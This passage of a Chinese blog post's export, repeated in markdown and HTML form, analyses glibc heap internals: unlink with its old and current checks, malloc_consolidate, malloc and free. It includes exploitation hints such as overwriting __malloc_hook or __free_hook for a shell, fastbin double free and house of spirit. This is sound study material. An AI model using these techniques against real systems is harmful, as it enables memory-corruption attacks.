malloc\n\n[大佬的malloc源码分析](https://blog.csdn.net/qq_41453285/article/details/99005759)\n\n[大佬的malloc源码分析](https://www.cnblogs.com/luoleqi/p/12731875.html#malloc)\n\n使用malloc函数申请内存块时，真正调用的其实是_libc_malloc函数，而_libc_malloc函数主要是对_int_malloc函数的封装，主要的工作在_int_malloc函数中完成。\n\n#### _libc_malloc\n\n_libc_malloc主要的功能是对_int_malloc的调用，寻找一个arena并尝试利用_int_malloc()分配内存，如果失败了则重新寻找arena。\n\n值得注意的是，**_libc_malloc()中会有一个叫做__malloc_hook的函数指针，如果有值就会执行其指向的函数，利用这点，我们可以修改__malloc_hook的值来get shell**。\n\n除此之外，**在进入_libc_malloc()之后，size就变成了无符号整数，所以malloc(负数)会申请一个很大的内存，如果够的话**。\n\n#### _int_malloc\n\n_int_malloc是真正执行内存分配的部分，其核心思想是**最佳适配**。\n\n大致流程：\n\n1. 根据申请的chunk大小，到对应的bin中寻找有无合适的chunk\n    1. 对于fast bin chunk，通过fd进行查找，将离头结点**最近**的chunk取出，若空则在small bin中找。\n    2. 对于small bin chunk，通过bk进行查找，将离头结点**最远**的chunk取出。\n    3. 对于large bin chunk或者**fast bin和small bin中都无刚好满足的chunk**，即在large bin中查找\n2. 如果需要在large bin中找chunk，那么首先会执行malloc_consolidate()整理fast bin，整理后放入unsorted bin\n3. 通过**bk指针**，对unsorted bin中的chunk进行遍历，如果大小正好则取出返回，否则**先将chunk放入对应的bin**中，**切割比需求大的最小**chunk返回，last remainer会放入unsorted bin（如果大于等于MIN_SIZE）。**如果分配成功，则将unsorted bin中的free chunk放到对应的bin中**。\n4. 如果没有满足需求的，则在large bin中查找正好合适的chunk取出返回，如果没有但有比他大的large bin chunk，则切割该chunk后取出返回。**(large bin 中切割产生的last remainder 如果小于MIN_SIZE，则会一起交给malloc使用，而不是放入unsorted bin)**\n5. 如果仍没有满足需求，则从top chunk中切割。\n6. 如果top chunk中也不够，则会执行一次malloc_consolidate()，并将unsorted bin中free chunk放到对应bin，再查找一次是否有能够分配的。\n7. 最后实在没办法就只能调用sysmalloc()进行分配。\n\n### free\n\n[大佬的free源码分析](https://blog.csdn.net/qq_41453285/article/details/99071778)\n\n[大佬的free源码分析](https://www.cnblogs.com/luoleqi/p/12822833.html)\n\n与malloc类似，free调用的也是_libc_free，实际上起主要作用的也是其中的_int_free。\n\n#### _libc_free\n\n主要功能：\n\n1. 检查有没有__free_hook，有则调用（**类似__malloc_hook，可以修改来get shell**）\n2. 如果chunk为NULL，则啥也不干\n3. 如果是mmap的chunk，则调用munmmap来free\n4. 调用_int_free()释放chunk\n\n#### _int_free\n\n对chunk进行释放，将其放入fast bin或unsorted bin，如果放入unsorted bin则考虑进行合并。\n\n主要流程：\n\n1. 进行安全检查，chunk的指针地址不能溢出，chunk的大小必须是按是按 2*SIZE_SZ 对齐的且大于等于MINSIZE\n2. 如果该chunk是fast bin chunk，则检查下一个chunk的size是否合法，之后**检查当前free的chunk是否是fast bin头结点连接的chunk**（防止直接的double free），之后将该chunk加入到对应大小的fast bin头（**不会清空prev_inuse**），释放结束\n3. 如果该chunk不是fast bin chunk，则考虑加入unosrted bin，先进行检查，保证当前chunk不能是top chunk，并且下一个chunk的size要合法（大于等于MIN_SIZE且小于该arena的内存总量）\n4. 之后考虑进行合并，先考虑与**前一个**free chunk进行合并，再考虑与**后一个不是top chunk的（如果下一个是top chunk则会并入top chunk）**free chunk进行合并,如果不能合并，则会清除后一个chunk的prev_inuse位，合并后将chunk加入到unsorted bin中。（large bin chunk 的fd_nextsize和bk_nextsize会赋NULL）\n5. 如果合并后的 chunk 大小大于 64KB，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate()函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。\n6. 判断是否需要对heap收缩，如果需要则收缩。\n\n注意：\n\n1. 释放chunk大小要2*SIZE_EZ对其，大小大于等于MIN_SIZE且没有地址溢出\n2. 释放fast bin，会检查bin头指向的chunk与该chunk是否一致，防止double free(**如果隔一个仍能实现fast bin double free**)\n3. 释放chunk的时候，chunk不能为top chunk，next chunk的地址不能超过当前分配区结束的地址，以及next chunk中chunk的prev_inuse标志位需置1(**构造house of spirit**)\n4. 当前 free 的 chunk 的下一个相邻 chunk 的大小需要大于 2*SIZE_SZ 且小于分配区所分配区的内存总量(**构造house of spirit**)\n5. 释放的chunk通过unlink脱链，注意unlink的检查(**也许会有对unlink的利用**)","slug":"heap_operation","published":1,"updated":"2023-01-03T15:00:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag0003s5oudgjpa92lt","content":"<p>这部分是对堆的一些操作（函数）的分析</p>\n<span id=\"more\"></span>\n<h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><p>unlink的作用<strong>是将一个chunk从bin中取出</strong>，在malloc、free、malloc_consolidate、realloc等函数中会用到。</p>\n<p><strong>值得注意的是：由于对fast bin和small bin的malloc没有用到unlink，因此经常会有漏洞在此处</strong></p>\n<h4 id=\"古老的unlink\"><a href=\"#古老的unlink\" class=\"headerlink\" title=\"古老的unlink\"></a>古老的unlink</h4><p>古老的unlink没有什么检查，只是单纯地把chunk从双向链表中取出，主要操作为：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//P是要取出的chunk</span></span><br><span class=\"line\">FD=P-&gt;fd;<span class=\"comment\">//FD为P的下一个chunk</span></span><br><span class=\"line\">BK=P-&gt;bk;<span class=\"comment\">//BK为P的前一个chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在fd和bk的双向链表中去掉P</span></span><br><span class=\"line\">FD-&gt;bk=BK;</span><br><span class=\"line\">BK-&gt;fd=FD;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//下面是针对large bin中nextsize字段的处理</span></span><br><span class=\"line\"><span class=\"comment\">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span></span><br><span class=\"line\"><span class=\"comment\">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span></span><br><span class=\"line\"><span class=\"comment\">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp;  __builtin_expect (P-&gt;fd_nextsize != <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>)) &#123;                      </span><br><span class=\"line\">    <span class=\"comment\">//类似于小的 chunk 的检查思路                                             </span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//如果FD没有在nextsize链表中，说明FD大小与P一样</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (FD-&gt;fd_nextsize == <span class=\"literal\">NULL</span>) </span><br><span class=\"line\">    &#123;                                      </span><br><span class=\"line\">        <span class=\"comment\">//如果nextsize串起来的双链表只有P本身，那就直接拿走P</span></span><br><span class=\"line\">        <span class=\"comment\">// 令 FD 为 nextsize 串起来的</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (P-&gt;fd_nextsize == P)                                      </span><br><span class=\"line\">            FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      </span><br><span class=\"line\">        <span class=\"keyword\">else</span> </span><br><span class=\"line\">        &#123;                                                              </span><br><span class=\"line\">            <span class=\"comment\">//否则我们需要将FD插入到nextsize形成的双链表中</span></span><br><span class=\"line\">            FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              </span><br><span class=\"line\">            FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              </span><br><span class=\"line\">            P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              </span><br><span class=\"line\">            P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              </span><br><span class=\"line\">        &#125;                                                              </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">else</span> </span><br><span class=\"line\">    &#123;                                                              </span><br><span class=\"line\">        <span class=\"comment\">//如果在的话，说明FD比P小，直接拿走P即可</span></span><br><span class=\"line\">        P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      </span><br><span class=\"line\">        P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      </span><br><span class=\"line\">    &#125;                                                                      </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"现在的unlink\"><a href=\"#现在的unlink\" class=\"headerlink\" title=\"现在的unlink\"></a>现在的unlink</h4><p>现在的unlink加入了一些检查</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在最开始处</span></span><br><span class=\"line\"><span class=\"comment\">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class=\"number\">0</span>))      </span><br><span class=\"line\">      malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在赋值FD和BK之前</span></span><br><span class=\"line\"><span class=\"comment\">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"number\">0</span>))                      </span><br><span class=\"line\">  malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在判断知道是large bin之后</span></span><br><span class=\"line\"><span class=\"comment\">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class=\"number\">0</span>)|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class=\"number\">0</span>))    </span><br><span class=\"line\">              malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>即使在加了检查之后，unlink仍然存在可以利用的地方，这些之后再说。</p>\n<h3 id=\"malloc-consolidate\"><a href=\"#malloc-consolidate\" class=\"headerlink\" title=\"malloc_consolidate\"></a>malloc_consolidate</h3><p>malloc_consolidate主要进行<strong>合并整理</strong>堆空间的操作，减少堆中的碎片，用于将 fastbin 中的空闲 chunk 合并整理到 unsorted_bin 中以及进行初始化堆的工作，在 malloc() 以及 free() 中均有可能调用 malloc_consolidate() 函数。</p>\n<p>若在调用malloc_consolidate()时，堆未初始化，则初始化堆。</p>\n<p>若已经初始化，则清空标志位，遍历fast bin中的chunk尝试合并。在合并时，首先考虑与<strong>低地址的相邻chunk</strong>合并，之后再考虑和<strong>高地址的相邻chunk</strong>合并，合并后加入到unsorted bin中（如果与top chunk合并则不用加入）。</p>\n<p>malloc_consolidate()的调用情况：</p>\n<ol>\n<li>malloc一个<strong>large bin chunk</strong>的时候，会**首先调用一次malloc_consolidate()**对fast bin进行整理，之后会将unsorted bin中的chunk分配到对应的bin中。</li>\n<li>如果malloc时要切割top chunk且<strong>top chunk也不够切割</strong>，那么会调用malloc_consolidate()对fast bin进行整理。</li>\n</ol>\n<p>一种特殊的consolidate:</p>\n<p>当切割chunk产生last remainder的时候，会触发consolidate对unsorted bin进行整理，但<strong>并不会对fast bin进行整理</strong>。</p>\n<h3 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h3><p><a href=\"https://blog.csdn.net/qq_41453285/article/details/99005759\">大佬的malloc源码分析</a></p>\n<p><a href=\"https://www.cnblogs.com/luoleqi/p/12731875.html#malloc\">大佬的malloc源码分析</a></p>\n<p>使用malloc函数申请内存块时，真正调用的其实是_libc_malloc函数，而_libc_malloc函数主要是对_int_malloc函数的封装，主要的工作在_int_malloc函数中完成。</p>\n<h4 id=\"libc-malloc\"><a href=\"#libc-malloc\" class=\"headerlink\" title=\"_libc_malloc\"></a>_libc_malloc</h4><p>_libc_malloc主要的功能是对_int_malloc的调用，寻找一个arena并尝试利用_int_malloc()分配内存，如果失败了则重新寻找arena。</p>\n<p>值得注意的是，**_libc_malloc()中会有一个叫做__malloc_hook的函数指针，如果有值就会执行其指向的函数，利用这点，我们可以修改__malloc_hook的值来get shell**。</p>\n<p>除此之外，<strong>在进入_libc_malloc()之后，size就变成了无符号整数，所以malloc(负数)会申请一个很大的内存，如果够的话</strong>。</p>\n<h4 id=\"int-malloc\"><a href=\"#int-malloc\" class=\"headerlink\" title=\"_int_malloc\"></a>_int_malloc</h4><p>_int_malloc是真正执行内存分配的部分，其核心思想是<strong>最佳适配</strong>。</p>\n<p>大致流程：</p>\n<ol>\n<li>根据申请的chunk大小，到对应的bin中寻找有无合适的chunk<ol>\n<li>对于fast bin chunk，通过fd进行查找，将离头结点<strong>最近</strong>的chunk取出，若空则在small bin中找。</li>\n<li>对于small bin chunk，通过bk进行查找，将离头结点<strong>最远</strong>的chunk取出。</li>\n<li>对于large bin chunk或者<strong>fast bin和small bin中都无刚好满足的chunk</strong>，即在large bin中查找</li>\n</ol>\n</li>\n<li>如果需要在large bin中找chunk，那么首先会执行malloc_consolidate()整理fast bin，整理后放入unsorted bin</li>\n<li>通过<strong>bk指针</strong>，对unsorted bin中的chunk进行遍历，如果大小正好则取出返回，否则<strong>先将chunk放入对应的bin</strong>中，<strong>切割比需求大的最小</strong>chunk返回，last remainer会放入unsorted bin（如果大于等于MIN_SIZE）。<strong>如果分配成功，则将unsorted bin中的free chunk放到对应的bin中</strong>。</li>\n<li>如果没有满足需求的，则在large bin中查找正好合适的chunk取出返回，如果没有但有比他大的large bin chunk，则切割该chunk后取出返回。**(large bin 中切割产生的last remainder 如果小于MIN_SIZE，则会一起交给malloc使用，而不是放入unsorted bin)**</li>\n<li>如果仍没有满足需求，则从top chunk中切割。</li>\n<li>如果top chunk中也不够，则会执行一次malloc_consolidate()，并将unsorted bin中free chunk放到对应bin，再查找一次是否有能够分配的。</li>\n<li>最后实在没办法就只能调用sysmalloc()进行分配。</li>\n</ol>\n<h3 id=\"free\"><a href=\"#free\" class=\"headerlink\" title=\"free\"></a>free</h3><p><a href=\"https://blog.csdn.net/qq_41453285/article/details/99071778\">大佬的free源码分析</a></p>\n<p><a href=\"https://www.cnblogs.com/luoleqi/p/12822833.html\">大佬的free源码分析</a></p>\n<p>与malloc类似，free调用的也是_libc_free，实际上起主要作用的也是其中的_int_free。</p>\n<h4 id=\"libc-free\"><a href=\"#libc-free\" class=\"headerlink\" title=\"_libc_free\"></a>_libc_free</h4><p>主要功能：</p>\n<ol>\n<li>检查有没有__free_hook，有则调用（<strong>类似__malloc_hook，可以修改来get shell</strong>）</li>\n<li>如果chunk为NULL，则啥也不干</li>\n<li>如果是mmap的chunk，则调用munmmap来free</li>\n<li>调用_int_free()释放chunk</li>\n</ol>\n<h4 id=\"int-free\"><a href=\"#int-free\" class=\"headerlink\" title=\"_int_free\"></a>_int_free</h4><p>对chunk进行释放，将其放入fast bin或unsorted bin，如果放入unsorted bin则考虑进行合并。</p>\n<p>主要流程：</p>\n<ol>\n<li>进行安全检查，chunk的指针地址不能溢出，chunk的大小必须是按是按 2*SIZE_SZ 对齐的且大于等于MINSIZE</li>\n<li>如果该chunk是fast bin chunk，则检查下一个chunk的size是否合法，之后<strong>检查当前free的chunk是否是fast bin头结点连接的chunk</strong>（防止直接的double free），之后将该chunk加入到对应大小的fast bin头（<strong>不会清空prev_inuse</strong>），释放结束</li>\n<li>如果该chunk不是fast bin chunk，则考虑加入unosrted bin，先进行检查，保证当前chunk不能是top chunk，并且下一个chunk的size要合法（大于等于MIN_SIZE且小于该arena的内存总量）</li>\n<li>之后考虑进行合并，先考虑与<strong>前一个</strong>free chunk进行合并，再考虑与<strong>后一个不是top chunk的（如果下一个是top chunk则会并入top chunk）</strong>free chunk进行合并,如果不能合并，则会清除后一个chunk的prev_inuse位，合并后将chunk加入到unsorted bin中。（large bin chunk 的fd_nextsize和bk_nextsize会赋NULL）</li>\n<li>如果合并后的 chunk 大小大于 64KB，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate()函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。</li>\n<li>判断是否需要对heap收缩，如果需要则收缩。</li>\n</ol>\n<p>注意：</p>\n<ol>\n<li>释放chunk大小要2*SIZE_EZ对其，大小大于等于MIN_SIZE且没有地址溢出</li>\n<li>释放fast bin，会检查bin头指向的chunk与该chunk是否一致，防止double free(<strong>如果隔一个仍能实现fast bin double free</strong>)</li>\n<li>释放chunk的时候，chunk不能为top chunk，next chunk的地址不能超过当前分配区结束的地址，以及next chunk中chunk的prev_inuse标志位需置1(<strong>构造house of spirit</strong>)</li>\n<li>当前 free 的 chunk 的下一个相邻 chunk 的大小需要大于 2*SIZE_SZ 且小于分配区所分配区的内存总量(<strong>构造house of spirit</strong>)</li>\n<li>释放的chunk通过unlink脱链，注意unlink的检查(<strong>也许会有对unlink的利用</strong>)</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>这部分是对堆的一些操作（函数）的分析</p>","more":"<h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><p>unlink的作用<strong>是将一个chunk从bin中取出</strong>，在malloc、free、malloc_consolidate、realloc等函数中会用到。</p>\n<p><strong>值得注意的是：由于对fast bin和small bin的malloc没有用到unlink，因此经常会有漏洞在此处</strong></p>\n<h4 id=\"古老的unlink\"><a href=\"#古老的unlink\" class=\"headerlink\" title=\"古老的unlink\"></a>古老的unlink</h4><p>古老的unlink没有什么检查，只是单纯地把chunk从双向链表中取出，主要操作为：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//P是要取出的chunk</span></span><br><span class=\"line\">FD=P-&gt;fd;<span class=\"comment\">//FD为P的下一个chunk</span></span><br><span class=\"line\">BK=P-&gt;bk;<span class=\"comment\">//BK为P的前一个chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在fd和bk的双向链表中去掉P</span></span><br><span class=\"line\">FD-&gt;bk=BK;</span><br><span class=\"line\">BK-&gt;fd=FD;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//下面是针对large bin中nextsize字段的处理</span></span><br><span class=\"line\"><span class=\"comment\">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span></span><br><span class=\"line\"><span class=\"comment\">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span></span><br><span class=\"line\"><span class=\"comment\">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp;  __builtin_expect (P-&gt;fd_nextsize != <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>)) &#123;                      </span><br><span class=\"line\">    <span class=\"comment\">//类似于小的 chunk 的检查思路                                             </span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//如果FD没有在nextsize链表中，说明FD大小与P一样</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (FD-&gt;fd_nextsize == <span class=\"literal\">NULL</span>) </span><br><span class=\"line\">    &#123;                                      </span><br><span class=\"line\">        <span class=\"comment\">//如果nextsize串起来的双链表只有P本身，那就直接拿走P</span></span><br><span class=\"line\">        <span class=\"comment\">// 令 FD 为 nextsize 串起来的</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (P-&gt;fd_nextsize == P)                                      </span><br><span class=\"line\">            FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      </span><br><span class=\"line\">        <span class=\"keyword\">else</span> </span><br><span class=\"line\">        &#123;                                                              </span><br><span class=\"line\">            <span class=\"comment\">//否则我们需要将FD插入到nextsize形成的双链表中</span></span><br><span class=\"line\">            FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              </span><br><span class=\"line\">            FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              </span><br><span class=\"line\">            P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              </span><br><span class=\"line\">            P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              </span><br><span class=\"line\">        &#125;                                                              </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">else</span> </span><br><span class=\"line\">    &#123;                                                              </span><br><span class=\"line\">        <span class=\"comment\">//如果在的话，说明FD比P小，直接拿走P即可</span></span><br><span class=\"line\">        P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      </span><br><span class=\"line\">        P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      </span><br><span class=\"line\">    &#125;                                                                      </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"现在的unlink\"><a href=\"#现在的unlink\" class=\"headerlink\" title=\"现在的unlink\"></a>现在的unlink</h4><p>现在的unlink加入了一些检查</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在最开始处</span></span><br><span class=\"line\"><span class=\"comment\">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class=\"number\">0</span>))      </span><br><span class=\"line\">      malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在赋值FD和BK之前</span></span><br><span class=\"line\"><span class=\"comment\">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"number\">0</span>))                      </span><br><span class=\"line\">  malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在判断知道是large bin之后</span></span><br><span class=\"line\"><span class=\"comment\">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class=\"number\">0</span>)|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class=\"number\">0</span>))    </span><br><span class=\"line\">              malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>即使在加了检查之后，unlink仍然存在可以利用的地方，这些之后再说。</p>\n<h3 id=\"malloc-consolidate\"><a href=\"#malloc-consolidate\" class=\"headerlink\" title=\"malloc_consolidate\"></a>malloc_consolidate</h3><p>malloc_consolidate主要进行<strong>合并整理</strong>堆空间的操作，减少堆中的碎片，用于将 fastbin 中的空闲 chunk 合并整理到 unsorted_bin 中以及进行初始化堆的工作，在 malloc() 以及 free() 中均有可能调用 malloc_consolidate() 函数。</p>\n<p>若在调用malloc_consolidate()时，堆未初始化，则初始化堆。</p>\n<p>若已经初始化，则清空标志位，遍历fast bin中的chunk尝试合并。在合并时，首先考虑与<strong>低地址的相邻chunk</strong>合并，之后再考虑和<strong>高地址的相邻chunk</strong>合并，合并后加入到unsorted bin中（如果与top chunk合并则不用加入）。</p>\n<p>malloc_consolidate()的调用情况：</p>\n<ol>\n<li>malloc一个<strong>large bin chunk</strong>的时候，会**首先调用一次malloc_consolidate()**对fast bin进行整理，之后会将unsorted bin中的chunk分配到对应的bin中。</li>\n<li>如果malloc时要切割top chunk且<strong>top chunk也不够切割</strong>，那么会调用malloc_consolidate()对fast bin进行整理。</li>\n</ol>\n<p>一种特殊的consolidate:</p>\n<p>当切割chunk产生last remainder的时候，会触发consolidate对unsorted bin进行整理，但<strong>并不会对fast bin进行整理</strong>。</p>\n<h3 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h3><p><a href=\"https://blog.csdn.net/qq_41453285/article/details/99005759\">大佬的malloc源码分析</a></p>\n<p><a href=\"https://www.cnblogs.com/luoleqi/p/12731875.html#malloc\">大佬的malloc源码分析</a></p>\n<p>使用malloc函数申请内存块时，真正调用的其实是_libc_malloc函数，而_libc_malloc函数主要是对_int_malloc函数的封装，主要的工作在_int_malloc函数中完成。</p>\n<h4 id=\"libc-malloc\"><a href=\"#libc-malloc\" class=\"headerlink\" title=\"_libc_malloc\"></a>_libc_malloc</h4><p>_libc_malloc主要的功能是对_int_malloc的调用，寻找一个arena并尝试利用_int_malloc()分配内存，如果失败了则重新寻找arena。</p>\n<p>值得注意的是，**_libc_malloc()中会有一个叫做__malloc_hook的函数指针，如果有值就会执行其指向的函数，利用这点，我们可以修改__malloc_hook的值来get shell**。</p>\n<p>除此之外，<strong>在进入_libc_malloc()之后，size就变成了无符号整数，所以malloc(负数)会申请一个很大的内存，如果够的话</strong>。</p>\n<h4 id=\"int-malloc\"><a href=\"#int-malloc\" class=\"headerlink\" title=\"_int_malloc\"></a>_int_malloc</h4><p>_int_malloc是真正执行内存分配的部分，其核心思想是<strong>最佳适配</strong>。</p>\n<p>大致流程：</p>\n<ol>\n<li>根据申请的chunk大小，到对应的bin中寻找有无合适的chunk<ol>\n<li>对于fast bin chunk，通过fd进行查找，将离头结点<strong>最近</strong>的chunk取出，若空则在small bin中找。</li>\n<li>对于small bin chunk，通过bk进行查找，将离头结点<strong>最远</strong>的chunk取出。</li>\n<li>对于large bin chunk或者<strong>fast bin和small bin中都无刚好满足的chunk</strong>，即在large bin中查找</li>\n</ol>\n</li>\n<li>如果需要在large bin中找chunk，那么首先会执行malloc_consolidate()整理fast bin，整理后放入unsorted bin</li>\n<li>通过<strong>bk指针</strong>，对unsorted bin中的chunk进行遍历，如果大小正好则取出返回，否则<strong>先将chunk放入对应的bin</strong>中，<strong>切割比需求大的最小</strong>chunk返回，last remainer会放入unsorted bin（如果大于等于MIN_SIZE）。<strong>如果分配成功，则将unsorted bin中的free 